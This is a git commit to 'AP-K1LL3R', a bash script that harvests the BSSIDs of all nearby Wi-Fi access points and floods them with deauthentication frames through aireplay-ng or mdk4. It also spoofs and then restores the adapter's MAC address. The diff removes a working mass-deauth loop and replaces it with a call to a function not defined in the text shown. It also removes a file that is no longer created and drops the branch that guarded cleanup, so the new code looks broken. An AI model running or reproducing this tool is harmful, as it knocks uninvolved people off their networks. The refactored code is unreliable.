35db839efe06fef856776a298c90388e68482464
0n1cOn3 <0n1cOn3@gmx.ch>
2023-01-07 01:16:41 +0100

    Update main.sh
    This PR removes the intermediate files sorted.txt, bssid.txt, and mac.txt that were being created and then immediately deleted. 
    It also combines the sort and uniq commands into a single command. Finally, it removes the awk command since it is not necessary if uniq is used.
    Also simplified some code parts here and there.

--- main.sh
+++ main.sh
@@ -9,23 +9,17 @@ CYAN="\e[36m"
 RESTORE="\e[39"
 BOLD="\e[1m"
 NORMAL="\e[0m"
-clear
 echo -e $BOLD"${CYAN}"
 figlet AP-K1LL3R
 sleep 1
 echo ""
-echo -e "${RED}[!] Important: ${MAGENTA}All errors will saved in ${RED}$path/error.log
+echo -e "${RED}[!] Important: ${MAGENTA}All errors will be saved in ${RED}$path/error.log
 ${MAGENTA}If you have any unexpected error, report it to my github:
-
-${YELLOW}https://github.com/ViperZCrew/ap_killer
-
-${RED}Version: v0.1 [BETA VERSION]
-
+${YELLOW}https://github.com/0n1cOn3/ap_killer
+${RED}Version: v0.1.1
 ${MAGENTA}Creator: MrBlackX
-
-${BLUE}Telegram: t.me/rebl0x3r
+${RED}Maintainer & Support: 0n1cOn3
 "
-
 echo -e "${GREEN}Starting script now..."
 sleep 1
 read -p "Press [Enter] to continue, press after 10 seconds CTRL+C. "
@@ -39,65 +33,44 @@ sleep 0.5
 echo -ne "${BLUE}[*] ${YELLOW}Successfully grabbed access points. Deauth ${CYAN}A${YELLOW}ll or ${CYAN}E${YELLOW}xit${CYAN}[A/E]?: "
 read exc
 
-if [[ $exc == "A" || $exc == "a" ]]
-then
-	if [ -f $FILE ]
-	then
-		sleep 0.5
-		echo -e "${BLUE}[*] ${YELLOW}File found ${GREEN}$path/$FILE"
-	else
-		echo -e "{BLUE}[!] ${YELLOW}File not found"
-	fi
 
-	cat aps.txt | grep : | cut -d\  -f1,2 | sed -e 's/[\t]//g;/^$/d' | sed -e 's/\CH//g' | head -n 1453 | tail -30 >> mac.txt 2>$path/error.log
-	FILE2='mac.txt'
-	if [ -f $FILE2 ]
-	then
-		sleep 1
-		echo -e "${BLUE}[*] ${YELLOW}Succefully extracted all mac addresses to: ${GREEN}$path/$FILE2"
-	else
-		echo -e "${RED}[!] ${YELLOW}No file found, please re-run script or check ${RED}$path$FILE2"
-		sleep 1
-	fi
-	sleep 1
-	echo -e "${BLUE}[*] ${YELLOW}Formatting BSSID file....."
-	sort mac.txt | uniq >> sorted.txt
-	rm mac.txt
-	mv -v sorted.txt bssid.txt &>/dev/null
-	cat -A -T bssid.txt | sed -e 's/[^a-z A-Z : 0-9]//g' >> mac.txt
-	rm -rf bssid.txt aps.txt
-	cat mac.txt | grep -o -E '(([[:xdigit:]]){2}:){5}([[:xdigit:]]){2}' >> result.txt
-	rm mac.txt
-	awk '!(count[$0]++)' result.txt >> endresult.txt
-	count=$(wc -l $path/endresult.txt | cut -d\  -f1)
-	sleep 1
-	echo -e "${BLUE}[*] ${YELLOW}I have collected ${GREEN}$count ${YELLOW}available BSSIDs."
-	echo -ne  "${BLUE}[*] ${YELLOW}How many times do you want to deauth wifi(default:10): "
-	read count
-	echo -e  "${BLUE}[*] ${YELLOW}Selected ${RED}$count ${YELLOW}will starting in few seconds..."
-	sleep 0.5
-	echo -e $GREEN ""
-	read -p "[*] Do you want Mdk4 or Aireplay method?[M/A]: " method
-	if [[ $method == "A" || $method == "a" ]]
-	then
-		echo -e "${BLUE}[*] ${YELLOW}Trying to attack with aireplay...."
-		sleep 1
-		while read -r line; do aireplay-ng --deauth $count -a $line --ignore-negative-one wlan0mon; done < endresult.txt
-	else
-		echo -e "${BLUE}[*] ${YELLOW}Trying to use MDK4 method..."
-		sleep 1
-		mdk4 wlan0mon d -w $path/endresult.txt -x 10 -c h
-	fi
+# Check if exc is "A" or "a"
+if [[ $exc == "A" || $exc == "a" ]]; then
+  # Check if file exists
+  if [ -f $FILE ]; then
+    sleep 0.5
+    echo -e "${BLUE}[*] ${YELLOW}File found ${GREEN}$path/$FILE"
+  else
+    echo -e "{BLUE}[!] ${YELLOW}File not found"
+  fi
+# Extract MAC addresses and save them to a file
+cat aps.txt | grep : | cut -d\  -f1,2 | sed -e 's/[\t]//g;/^$/d' | sed -e 's/\CH//g' | head -n 1453 | tail -30 >> mac.txt 2>$path/error.log
+FILE2='mac.txt'
+if [ -f $FILE2 ]; then
+  sleep 1
+  echo -e "${BLUE}[*] ${YELLOW}Succefully extracted all mac addresses to: ${GREEN}$path/$FILE2"
 else
-	sleep 0.5
-	echo -e "${RED}[!] ${MAGENTA}Leaving..."
-	echo -e "${BLUE}[*] ${YELLOW}Disabling adapter mode.."
-	airmon-ng stop wlan0mon 2>$path/error.log
-	rm *.txt
-	echo -e "${BLUE}[*] ${YELLOW}Restoring original mac..."
-	ifconfig wlan0 down
-	macchanger -p wlan0 2>$path/error.log
-	ifconfig wlan0 up
-	service network-manager restart
+  echo -e "${RED}[!] ${YELLOW}No file found, please re-run script or check ${RED}$path$FILE2"
+  sleep 1
 fi
-#rm *.txt
+sleep 1
+sort mac.txt | uniq >> endresult.txt
+rm mac.txt result.txt
+count=$(wc -l $path/endresult.txt | cut -d\  -f1)
+echo -e "${BLUE}[*] ${YELLOW}I have collected ${GREEN}$count ${YELLOW}available BSSIDs."
+echo -ne  "${BLUE}[*] ${YELLOW}How many times do you want to deauth wifi(default:10): "
+read count
+echo -e  "${BLUE}[*] ${YELLOW}Selected ${RED}$count ${YELLOW}will starting in few seconds..."
+read -p "[*] Do you want Mdk4 or Aireplay method?[M/A]: " method
+# Perform the deauth attack
+deauth_attack
+# Disable adapter mode and restore original MAC
+echo -e "${RED}[!] ${MAGENTA}Leaving..."
+echo -e "${BLUE}[*] ${YELLOW}Disabling adapter mode.."
+airmon-ng stop wlan0mon 2>$path/error.log
+rm *.txt
+echo -e "${BLUE}[*] ${YELLOW}Restoring original mac..."
+ifconfig wlan0 down
+macchanger -p wlan0 2>$path/error.log
+ifconfig wlan0 up
+service network-manager restart
